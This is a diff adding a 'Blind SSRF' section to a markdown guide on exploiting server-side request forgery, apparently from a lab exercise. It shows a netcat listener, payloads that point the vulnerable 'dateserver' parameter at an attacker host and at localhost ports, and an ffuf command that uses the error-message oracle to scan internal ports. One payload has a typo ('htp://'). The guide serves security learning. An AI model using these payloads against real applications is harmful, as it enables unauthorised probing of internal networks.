@@ -12,6 +12,7 @@ This document summarizes core techniques for identifying and exploiting **server
     - [SSRF - Internal Port Scanning](#ssrf---internal-port-scanning)
     - [SSRF - Accessing Restricted Endpoints](#ssrf---accessing-restricted-endpoints)
     - [SSRF - Local File Inclusion (LFI)](#ssrf---local-file-inclusion-lfi)
+    - [Blind SSRF](#blind-ssrf)
 
 ---
 
@@ -212,3 +213,81 @@ At this point, the impact of the vulnerability increases significantly. Dependin
 This highlights why SSRF vulnerabilities should be treated as **high severity**, especially when URL scheme validation and outbound request restrictions are not properly enforced.
 
 ---
+
+### Blind SSRF
+
+In some cases, the response to an SSRF payload is **not returned to the attacker**. These vulnerabilities are referred to as **blind SSRF**. While blind SSRF generally limits direct data exfiltration, it can still be leveraged for **internal network enumeration**, service discovery, and attack surface mapping.
+
+As with standard SSRF, blind SSRF is initially identified by supplying a URL that points to a server under the attacker’s control.
+
+```bash
+nc -lvnp 8001
+```
+
+```bash
+dateserver=htp://10.10.14.137:8001/ssrf&date=2026-01-01
+```
+
+![Filtered output](images/blind-ssrf.PNG)
+
+Receiving a connection confirms that the application is making outbound requests based on user-controlled input, and therefore is vulnerable to SSRF.
+
+When directing the application to request its own content, no response body is returned to the user. Instead, a generic message is displayed:
+
+```bash
+dateserver=http://127.0.0.1:80&date=2026-01-01
+```
+
+```
+Date is unavailable. Please choose a different date!
+```
+
+![Filtered output](images/blind-ssrf2.PNG)
+
+However, when the application is pointed to a closed port, the response differs:
+
+```bash
+dateserver=http://127.0.0.1:81&date=2026-01-01
+```
+
+```
+Something went wrong!
+```
+
+![Filtered output](images/blind-ssrf3.PNG)
+
+The difference in responses between open and closed ports indicates that, despite being blind, the SSRF vulnerability can still be exploited as an **oracle** to infer internal network state.
+
+To enumerate internal services, we first generate a list of candidate ports:
+
+```bash
+seq 1 10000 > ports.txt
+```
+
+Using `ffuf`, we fuzz the `dateserver` parameter while filtering out responses associated with closed ports:
+
+```bash
+ffuf -w ports.txt:FUZZ -u http://10.129.129.65/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2026-01-01" -fr "Something went wrong"
+```
+
+The scan reveals two open internal ports:
+
+- `80`
+- `5000`
+
+![Filtered output](images/blind-ssrf4.PNG)
+
+Although blind SSRF prevents direct response inspection, it can still be used to:
+
+- Enumerate open internal ports
+- Identify internal services and applications
+- Infer file existence or service behavior based on response differences
+- Gather intelligence for chaining into higher-impact attacks
+
+Even limited SSRF findings should be treated seriously, as they often act as stepping stones toward deeper compromise.
+
+---
+
+
+
+
